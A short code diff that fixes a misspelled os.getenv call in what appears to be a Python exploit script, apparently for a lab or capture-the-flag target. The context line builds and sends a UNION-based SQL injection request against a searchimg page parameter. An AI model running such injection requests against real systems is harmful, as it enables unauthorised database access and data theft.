@@ -21,7 +21,7 @@ try:
 except Exception as e:
     print(e)
 
-ip = os.getnev('IP')
+ip = os.getenv('IP')
 link = "http://" + ip + "/index.php?page=searchimg&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
 f = requests.get(link)
 
